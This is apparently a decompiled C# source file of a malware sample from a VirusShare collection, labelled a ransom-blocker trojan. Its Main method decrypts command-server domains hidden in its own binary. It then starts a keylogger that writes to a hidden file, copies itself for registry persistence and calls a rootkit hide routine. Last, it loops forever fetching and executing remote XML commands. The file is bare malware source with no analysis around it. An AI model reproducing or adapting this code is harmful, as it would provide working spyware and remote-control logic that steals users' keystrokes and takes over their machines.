// Decompiled with JetBrains decompiler
// Type: flu.Program
// Assembly: flu-nucleo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1FFD10A3-F795-4E6C-98F1-531878AC8FB2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00040-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-95e0689d187b08f029efa892400fba3cceb7785a02a7c89bae7ec0db19434304.exe

using System;
using System.IO;
using System.Net.NetworkInformation;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace flu
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      XMLReader xmlReader = new XMLReader();
      StreamReader streamReader = new StreamReader(Application.ExecutablePath);
      BinaryReader binaryReader = new BinaryReader(streamReader.BaseStream);
      byte[] bytes = binaryReader.ReadBytes(Convert.ToInt32(streamReader.BaseStream.Length));
      binaryReader.Close();
      streamReader.Close();
      int index = Encoding.ASCII.GetString(bytes).IndexOf("-||-");
      string[] strArray = Crypto.DecryptDomains(Encoding.ASCII.GetString(bytes, index, bytes.Length - index).Replace("-||-", "").Split('¬')[0]).Split('¬');
      try
      {
        Network.XML = strArray[1];
      }
      catch
      {
      }
      try
      {
        Network.Domain = strArray[0];
      }
      catch
      {
      }
      try
      {
        Network.MAC = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString();
      }
      catch
      {
      }
      try
      {
        File file1 = new File(Application.ExecutablePath);
        string str1 = string.Empty;
        string empty = string.Empty;
        bool flag = file1.existKey("win32");
        string str2;
        if (!flag)
        {
          str1 = Path.GetRandomFileName().Replace(".", "");
          str2 = OS.InfectionPath() + "\\" + str1 + ".txt";
        }
        else
          str2 = file1.getKeyValue("win32").Replace(".exe", ".txt");
        try
        {
          KeyLogger keyLogger = new KeyLogger(str2)
          {
            FlushInterval = Convert.ToDouble(15000),
            Enabled = true
          };
          StreamWriter streamWriter = new StreamWriter(str2, true);
          streamWriter.WriteLine("Teclas pulsadas por el usuario:\r\n");
          streamWriter.Close();
          new File(str2).Protect();
        }
        catch
        {
        }
        if (!flag)
        {
          try
          {
            file1.Protect();
            string str3 = OS.InfectionPath() + "\\" + str1 + ".exe";
            file1.CopyTo(str3);
            File file2 = new File(str3);
            file2.Register(File.RunLocation.InRegistry);
            file2.Protect();
          }
          catch
          {
          }
        }
      }
      catch
      {
      }
      try
      {
        Rootkit.Hide();
      }
      catch
      {
      }
      while (true)
      {
        try
        {
          if (Network.Online())
          {
            try
            {
              Network.UpdateState(OS.Version());
            }
            catch
            {
            }
            try
            {
              xmlReader.GetXML();
            }
            catch
            {
            }
            try
            {
              xmlReader.ExecuteXML();
            }
            catch
            {
              System.Console.WriteLine("Error no hay XML cargado");
            }
          }
          try
          {
            Thread.Sleep(2000);
          }
          catch
          {
          }
        }
        catch
        {
        }
      }
    }
  }
}
